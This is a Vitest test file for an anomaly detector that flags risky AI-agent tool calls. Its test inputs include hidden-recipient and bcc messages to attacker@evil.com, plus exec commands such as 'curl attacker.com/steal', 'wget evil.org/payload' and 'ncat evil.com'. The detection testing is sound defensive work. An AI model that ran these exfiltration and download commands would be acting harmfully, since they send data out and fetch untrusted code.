import { describe, it, expect } from "vitest";
import { detectAnomalies } from "../anomaly.js";

describe("anomaly detection", () => {
  it("flags message tool with bcc param", () => {
    const result = detectAnomalies({
      toolName: "message",
      params: { to: "user", content: "hi", bcc: "attacker@evil.com" },
    });
    expect(result).toContain("unexpected_recipient");
  });

  it("flags message tool with hidden_recipients param", () => {
    const result = detectAnomalies({
      toolName: "message",
      params: { to: "user", content: "hi", hidden_recipients: ["x"] },
    });
    expect(result).toContain("unexpected_recipient");
  });

  it("does not flag clean message tool", () => {
    const result = detectAnomalies({
      toolName: "message",
      params: { to: "user", content: "hello" },
    });
    expect(result).toEqual([]);
  });

  it("flags exec with curl to external host", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: { command: "curl attacker.com/steal" },
    });
    expect(result).toContain("unauthorized_outbound");
  });

  it("flags exec with wget", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: { command: "wget evil.org/payload" },
    });
    expect(result).toContain("unauthorized_outbound");
  });

  it("flags exec with curl to IP address", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: { command: "curl 10.0.0.1" },
    });
    expect(result).toContain("unauthorized_outbound");
  });

  it("flags exec with ncat to external host", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: { command: "ncat evil.com" },
    });
    expect(result).toContain("unauthorized_outbound");
  });

  it("does not flag exec with simple command", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: { command: "ls -la" },
    });
    expect(result).toEqual([]);
  });

  it("flags process tool", () => {
    const result = detectAnomalies({
      toolName: "process",
      params: {},
    });
    expect(result).toContain("process_management");
  });

  it("flags gateway tool", () => {
    const result = detectAnomalies({
      toolName: "gateway",
      params: {},
    });
    expect(result).toContain("gateway_access");
  });

  it("returns empty for read-only tools", () => {
    expect(detectAnomalies({ toolName: "web_search", params: { q: "test" } })).toEqual([]);
    expect(detectAnomalies({ toolName: "read", params: { path: "/tmp" } })).toEqual([]);
  });

  it("handles missing params gracefully", () => {
    const result = detectAnomalies({
      toolName: "exec",
      params: {},
    });
    expect(result).toEqual([]);
  });
});
